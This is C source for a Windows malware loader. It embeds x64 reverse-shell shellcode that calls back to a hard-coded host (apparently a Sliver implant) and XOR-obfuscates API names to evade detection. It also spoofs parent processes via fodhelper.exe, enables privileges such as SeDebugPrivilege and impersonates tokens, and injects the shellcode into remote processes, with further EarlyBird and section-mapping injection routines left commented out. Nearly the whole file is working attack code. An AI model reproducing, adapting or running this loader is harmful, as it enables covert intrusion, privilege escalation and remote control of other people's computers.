#include "global.h"


BOOL getToken(HANDLE elevProc) {


	STARTUPINFOA si;
	PROCESS_INFORMATION pi;


	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));


	HANDLE tokenHandle, dupToken = NULL;



	if (!OpenProcessToken(elevProc, TOKEN_QUERY, &tokenHandle)) {
		//printf("fail");
		int lastError = GetLastError();

	}
	void* tokenUser[10240] = { 0 };
	DWORD dwTokeLen = 0;

	if (!GetTokenInformation(tokenHandle, TokenUser, NULL, dwTokeLen, &dwTokeLen));
	{
		int lastError = GetLastError();
		//printf(lastError);
		// Should be a switch, of course. Omitted for brevity
		if (lastError == ERROR_INSUFFICIENT_BUFFER)
		{
			int i = 0;
		}
	}


	WCHAR sturr[] = L"C:\\windows\\system32\\cmd.exe";
	LPWSTR app = &sturr;
	//CreateProcess(dupToken, app, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	CreateProcess(dupToken,
		app,
		NULL,
		NULL,
		FALSE,
		CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi);
	return TRUE;

}

unsigned char payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x48, 0x31, 0xd2, 0x56, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x4d, 0x31, 0xc9, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x48, 0x8b, 0x52, 0x20, 0x41, 0x51, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f,
  0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x8b,
  0x48, 0x18, 0x50, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48,
  0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58,
  0x48, 0x01, 0xd0, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49,
  0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
  0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5,
  0x49, 0xbc, 0x02, 0x00, 0x27, 0x0f, 0xc0, 0xa8, 0x38, 0x01, 0x41, 0x54,
  0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
  0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
  0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50,
  0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89,
  0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf,
  0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89,
  0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5,
  0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00,
  0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9,
  0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8,
  0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20,
  0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00,
  0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4,
  0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31,
  0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba,
  0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58,
  0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00,
  0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41,
  0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c,
  0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6,
  0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d,
  0x2a, 0x0a, 0x41, 0x89, 0xda, 0xff, 0xd5
};
unsigned int payload_len = sizeof(payload);


void encryptDecryptP(char* input, char* key, size_t key_len, size_t data_len) {

	char test;
	char xormod;
	for (int i = 0; i < strlen(input); i++) {

		xormod = key[i % (key_len)];
		test = input[i] ^ xormod;
		if (test != '\0') {
			input[i] = input[i] ^ xormod;
		}
		else {
			//printf("got one %c\n", test);
		}
	}
}


BOOL(WINAPI* pVirtProt)(LPVOID lpAddr, SIZE_T dwS, DWORD flNewProt, PDWORD oldProt);
LPVOID(WINAPI* pvAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
//VOID (WINAPI * rtlMM) (_Out_ VOID UNALIGNED *Destination, _In_  const VOID UNALIGNED *Source,_In_ SIZE_T Length);
HANDLE(WINAPI* pcrThre) (
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);
FARPROC(WINAPI* pGetProc)(
	HMODULE a,
	LPCSTR  b
	);
LPVOID(WINAPI* pVirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

BOOL(WINAPI* pWriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
	);

DWORD(WINAPI* pRtlCreateUserThread)(
	IN HANDLE 					ProcessHandle,
	IN PSECURITY_DESCRIPTOR 	SecurityDescriptor,
	IN BOOL 					CreateSuspended,
	IN ULONG					StackZeroBits,
	IN OUT PULONG				StackReserved,
	IN OUT PULONG				StackCommit,
	IN LPVOID					StartAddress,
	IN LPVOID					StartParameter,
	OUT HANDLE 					ThreadHandle,
	OUT LPVOID					ClientID
	);



int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	BOOL bStatus = FALSE;

	pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
	pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
	pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");

	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL)) {
		return;
	}

	bStatus = (BOOL)pRtlCreateUserThread(hProc, NULL, 0, 0, 0, 0, pRemoteCode, NULL, &hThread, NULL);
	//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, 0, 0, 0);
	if (bStatus != FALSE) {
		WaitForSingleObject(hThread, -1);
		CloseHandle(hThread);
		return 0;
	}
	else
		return -1;
}




BOOL executeSliv(HANDLE hToken) {


	if (!ImpersonateLoggedOnUser(hToken)) {
		return FALSE;
	}

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	char key[] = "WaitForSingleObject";

	char getPAddressStr[] = { 0x10, 0x4, 0x1d, 0x24, 0x34, 0x6f, 0x11, 0x12, 0xd, 0xa, 0x15, 0x9, 0x16, 0x3c, 0x0 };
	char virtAllocStr[] = { 0x1, 0x8, 0x1b, 0x74, 0x33, 0xe, 0x1e, 0x12, 0x5, 0x2, 0x8, 0xf, 0x0 };
	//char virtAllocStr[] = "VirtualAlloc";
	char virtProtStr[] = { 0x1, 0x8, 0x1b, 0x74, 0x33, 0xe, 0x1e, 0x3, 0x1b, 0x1, 0x13, 0x9, 0x6, 0x3b, 0x0 };
	char crThrStr[] = { 0x14, 0x13, 0xc, 0x15, 0x32, 0xa, 0x26, 0x3b, 0x1b, 0xb, 0x6, 0x8, 0x0 };

	encryptDecryptP((char*)getPAddressStr, key, sizeof(key), sizeof(getPAddressStr));
	pGetProc = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), getPAddressStr);

	// Allocate buffer for payload
	//XOR((char*)virtAllocStr, strlen(virtAllocStr), key, sizeof(key));
	encryptDecryptP((char*)virtAllocStr, key, sizeof(key), sizeof(virtAllocStr));
	//GetModuleHandleW("Kernel32.dll")
	pvAlloc = pGetProc(GetModuleHandleW(L"Kernel32.dll"), virtAllocStr);

	//pvAlloc = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "VirtualAlloc");

	exec_mem = pvAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//printf("%-20s : 0x%-016p\n", "sliver_payload addr", (void*)calc_payload);
	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make the buffer executable
	//XOR((char*)virtProtStr, strlen(virtProtStr), key, sizeof(key));
	encryptDecryptP((char*)virtProtStr, key, sizeof(key), sizeof(virtProtStr));
	pVirtProt = pGetProc(GetModuleHandleW(L"kernel32.dll"), virtProtStr);
	rv = pVirtProt(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);


	//printf(baseStr);
	// If all good, run the payload
	if (rv != 0) {

		encryptDecryptP((char*)crThrStr, key, sizeof(key), sizeof(crThrStr));
		pcrThre = pGetProc(GetModuleHandleW(L"kernel32.dll"), crThrStr);
		th = pcrThre(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return TRUE;

}



HANDLE fatToke = NULL;

BOOL elevateNInject(_In_ HANDLE parentProc) {

	SIZE_T size = 0x30;

	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);

	if (size > 1024) { return FALSE; }

	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);
	if (!si.lpAttributeList) { return FALSE; }

	if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) { return FALSE; }
	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProc, sizeof(HANDLE), 0, 0)) //-V616
	{
		return FALSE;
	}
	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = SW_SHOW;
	//L"C:\\Windows\\System32\\appverif.exe";
	//L"C:\\Windows\\System32\\eudcedit.exe";
	//L"C:\\Windows\\System32\\fodhelper.exe"
	wchar_t payload[] = L"C:\\Windows\\System32\\fodhelper.exe";
	if (!CreateProcess(NULL,
		payload,
		NULL,
		NULL,
		TRUE,
		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi))
	{
		return FALSE;
	}




	//Duplicate Process token and use to wreak havoc
	//***************************************************************
	//***************************************************************


	HANDLE token;


	if (!OpenProcessToken(pi.hProcess, TOKEN_ALL_ACCESS, &token))
	{
		return FALSE;
	}

	int privCount = 7;

	PRIVARR tp;
	tp.PrivilegeCount = privCount;
	LUID luid;

	DWORD dError;

	wchar_t* privs[7] = { '\0' };
	privs[0] = L"SeDebugPrivilege";
	privs[1] = L"SeLoadDriverPrivilege";
	privs[2] = L"SeTakeOwnershipPrivilege";
	privs[3] = L"SeBackupPrivilege";
	privs[4] = L"SeImpersonatePrivilege";
	privs[5] = L"SeIncreaseQuotaPrivilege";
	privs[6] = L"SeAssignPrimaryTokenPrivilege";

	//enablePrivs(dupToken, privCount, privs);

	for (int i = 0; i < privCount; i++) {
		if (!LookupPrivilegeValue(
			NULL,            // lookup privilege on local system
			privs[i],   // privilege to lookup 
			&luid))        // receives LUID of privilege
		{
			return FALSE;
		}

		tp.Privileges[i].Luid = luid;
		tp.Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;

	}

	if (!AdjustTokenPrivileges(
		token,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))

	{
		return FALSE;
	}

	HANDLE dupToken = NULL;
	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &dupToken))
	{
		return FALSE;
	}
	if (!SetThreadToken(NULL, dupToken)) {

		return FALSE;
	}


	HANDLE hProc = pi.hProcess;
	classicInject(hProc);

	//spoofParent(hProc);

	//TerminateProcess(parentProc, 0);
	//TerminateProcess(pi.hProcess, 0);
	//spoofParent(pi.hProcess);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	//if (si.lpAttributeList)
	//	DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

	//supHeapFree(si.lpAttributeList);

	return TRUE;
}

BOOL spoofParent(HANDLE parent) {


	HANDLE dupHandle = NULL;
	NtDuplicateObject(parent,
		NtCurrentProcess(),
		NtCurrentProcess(),
		&dupHandle,
		PROCESS_ALL_ACCESS,
		0,
		0);

	SIZE_T size = 0x30;
	STARTUPINFOEX si;
	PROCESS_INFORMATION pi;

	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&si, sizeof(si));
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);

	if (size > 1024) { return FALSE; }

	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
		GetProcessHeap(),
		0,
		size
	);

	if (!si.lpAttributeList) { return FALSE; }

	if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) { return FALSE; }
	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &dupHandle, sizeof(HANDLE), 0, 0)) //-V616
	{
		return FALSE;
	}
	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = SW_SHOW;
	wchar_t payload[] = L"C:\\Windows\\System32\\svchost.exe";
	if (!CreateProcess(NULL,
		payload,
		NULL,
		NULL,
		TRUE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		(LPSTARTUPINFO)&si,
		&pi))
	{
		return FALSE;
	}

	classicInject(pi.hProcess);

	//if (si.lpAttributeList)
	//	DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

	//supHeapFree(si.lpAttributeList);
}


BOOL classicInject(HANDLE hProc) {


	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	BOOL bStatus = FALSE;

	pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
	pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
	pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");

	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL)) {
		return FALSE;
	}

	bStatus = pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, &hThread, NULL);

	if (bStatus != FALSE) {
		WaitForSingleObject(hThread, -1);
		CloseHandle(hThread);
		return 0;
	}
	else
		return FALSE;

}

/*

// EarlyBird injection
BOOL earlybird (HANDLE hProc) {

	int pid = 0;


	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	void* pRemoteCode;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	//CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	// Decrypt and inject payload
	//AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));

	// Allocate memory for payload and throw it in
	pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

	QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

	ResumeThread(pi.hThread);

	return 0;
}


typedef LPVOID(WINAPI* VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);

typedef VOID(WINAPI* RtlMoveMemory_t)(
	VOID UNALIGNED* Destination,
	const VOID UNALIGNED* Source,
	SIZE_T Length);

typedef FARPROC(WINAPI* RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


typedef NTSTATUS(NTAPI* NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL);

typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);


// map section views injection
int InjectVIEW(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {



	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	// create memory section
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateSection");
	if (pNtCreateSection == NULL)
		return -2;
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create local section view
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return -2;
	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T*)&payload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// throw the payload into the section
	memcpy(pLocalView, payload, payload_len);

	// create remote section view (target process)
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T*)&payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	//printf("wait: pload = %p ; rview = %p ; lview = %p\n", payload, pRemoteView, pLocalView);
	//getchar();

	// execute the payload
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return -1;
}

*/